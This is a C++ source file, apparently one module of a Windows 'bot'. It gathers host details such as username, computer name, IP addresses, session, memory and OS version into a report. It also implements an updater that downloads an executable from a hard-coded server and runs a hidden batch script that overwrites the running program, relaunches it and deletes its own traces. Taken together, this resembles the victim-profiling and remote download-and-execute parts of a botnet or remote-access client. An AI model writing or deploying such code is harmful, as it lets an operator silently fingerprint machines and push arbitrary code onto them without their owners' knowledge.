#include "system_info.h"
#include <winsock2.h>
#include <iostream>
#include <cstdio>
#include <lmcons.h>
#include <sstream>
#include <iomanip>
#include <wininet.h>
#include <fstream>
#include <direct.h>
#include <io.h>

#pragma comment(lib, "wininet.lib")

// Version information
const std::string SystemInfo::VERSION = "1.0.0";
const std::string SystemInfo::UPDATE_SERVER_URL = "http://192.168.1.100:8080/updates/";

std::string SystemInfo::getSystemInformation() {
    std::stringstream ss;
    
    ss << "=== SYSTEM INFORMATION ===" << std::endl;
    ss << "Bot Version: " << VERSION << std::endl;
    ss << getBasicSystemInfo();
    ss << getNetworkInfo();
    ss << getUserInfo();
    ss << getMemoryInfo();
    ss << getTimeInfo();
    ss << "=========================" << std::endl;
    
    return ss.str();
}

std::string SystemInfo::getVersion() {
    return VERSION;
}

std::string SystemInfo::getUpdateUrl() {
    return UPDATE_SERVER_URL;
}

bool SystemInfo::checkForUpdates() {
    try {
        HINTERNET hInternet = InternetOpen("Bot Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            std::cerr << "Failed to initialize WinINet" << std::endl;
            return false;
        }
        
        std::string versionUrl = UPDATE_SERVER_URL + "version.txt";
        HINTERNET hUrl = InternetOpenUrl(hInternet, versionUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            return false;
        }
        
        char buffer[256];
        DWORD bytesRead;
        std::string serverVersion;
        
        while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            serverVersion += buffer;
        }
        
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        
        // Remove whitespace and newlines
        serverVersion.erase(0, serverVersion.find_first_not_of(" \t\r\n"));
        serverVersion.erase(serverVersion.find_last_not_of(" \t\r\n") + 1);
        
        std::cout << "Current version: " << VERSION << std::endl;
        std::cout << "Server version: " << serverVersion << std::endl;
        
        return serverVersion != VERSION;
    }
    catch (const std::exception& e) {
        std::cerr << "Error checking for updates: " << e.what() << std::endl;
        return false;
    }
}

bool SystemInfo::downloadAndUpdate(const std::string& updateUrl) {
    try {
        std::cout << "Starting update process..." << std::endl;
        
        // Get current executable path
        char exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);
        std::string currentExe = exePath;
        
        // Create temporary directory for update
        char tempPath[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        std::string tempDir = std::string(tempPath) + "bot_update\\";
        _mkdir(tempDir.c_str());
        
        std::string newExePath = tempDir + "modular_bot_new.exe";
        std::string updaterPath = tempDir + "updater.exe";
        
        // Download new version
        std::cout << "Downloading new version..." << std::endl;
        if (!downloadFile(updateUrl, newExePath)) {
            std::cerr << "Failed to download new version" << std::endl;
            return false;
        }
        
        // Create updater script
        std::string updaterScript = tempDir + "update.bat";
        std::ofstream script(updaterScript);
        script << "@echo off\n";
        script << "timeout /t 2 /nobreak > nul\n";
        script << "copy \"" << newExePath << "\" \"" << currentExe << "\"\n";
        script << "start \"\" \"" << currentExe << "\"\n";
        script << "del \"" << updaterScript << "\"\n";
        script << "rmdir /s /q \"" << tempDir << "\"\n";
        script.close();
        
        // Execute updater
        std::cout << "Installing update..." << std::endl;
        ShellExecute(NULL, "open", updaterScript.c_str(), NULL, NULL, SW_HIDE);
        
        // Exit current process
        std::cout << "Update initiated. Exiting..." << std::endl;
        Sleep(1000);
        exit(0);
        
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Error during update: " << e.what() << std::endl;
        return false;
    }
}

bool SystemInfo::downloadFile(const std::string& url, const std::string& localPath) {
    HINTERNET hInternet = InternetOpen("Bot Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    std::ofstream file(localPath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[4096];
    DWORD bytesRead;
    
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        file.write(buffer, bytesRead);
    }
    
    file.close();
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return true;
}

std::string SystemInfo::getBasicSystemInfo() {
    std::stringstream ss;
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerName(computerName, &size);
    
    char username[256];
    DWORD usernameSize = sizeof(username);
    GetUserName(username, &usernameSize);
    
    ss << "Username: " << username << std::endl;
    ss << "Computer Name: " << computerName << std::endl;
    
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osvi);
    
    ss << "Windows Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << std::endl;
    
    char currentDir[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentDir);
    ss << "Current Directory: " << currentDir << std::endl;
    
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        ss << "Hostname: " << hostname << std::endl;
    }
    
    return ss.str();
}

std::string SystemInfo::getNetworkInfo() {
    std::stringstream ss;
    ss << "=== NETWORK INTERFACES ===" << std::endl;
    
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent* host = gethostbyname(hostname);
        if (host != NULL) {
            char* primaryIP = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
            ss << "Primary IP: " << primaryIP << std::endl;
            
            // Get additional network interfaces
            int interfaceCount = 0;
            for (int i = 1; host->h_addr_list[i] != NULL; i++) {
                char* ip = inet_ntoa(*(struct in_addr*)host->h_addr_list[i]);
                ss << "Network IP " << ++interfaceCount << ": " << ip << std::endl;
            }
        }
    }
    
    return ss.str();
}

std::string SystemInfo::getUserInfo() {
    std::stringstream ss;
    ss << "=== USER INFO ===" << std::endl;
    
    char username[256];
    DWORD usernameSize = sizeof(username);
    GetUserName(username, &usernameSize);
    ss << "Current User: " << username << std::endl;
    
    DWORD sessionId;
    if (ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) {
        ss << "Session ID: " << sessionId << std::endl;
    }
    
    return ss.str();
}

std::string SystemInfo::getMemoryInfo() {
    std::stringstream ss;
    
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    DWORDLONG totalPhysMem = memInfo.ullTotalPhys;
    DWORDLONG availPhysMem = memInfo.ullAvailPhys;
    
    ss << "Total RAM: " << (totalPhysMem / (1024 * 1024)) << " MB" << std::endl;
    ss << "Available RAM: " << (availPhysMem / (1024 * 1024)) << " MB" << std::endl;
    
    return ss.str();
}

std::string SystemInfo::getTimeInfo() {
    std::stringstream ss;
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    ss << "System Time: " << st.wYear << "-" 
       << std::setfill('0') << std::setw(2) << st.wMonth << "-"
       << std::setfill('0') << std::setw(2) << st.wDay << " "
       << std::setfill('0') << std::setw(2) << st.wHour << ":"
       << std::setfill('0') << std::setw(2) << st.wMinute << ":"
       << std::setfill('0') << std::setw(2) << st.wSecond << std::endl;
    
    return ss.str();
} 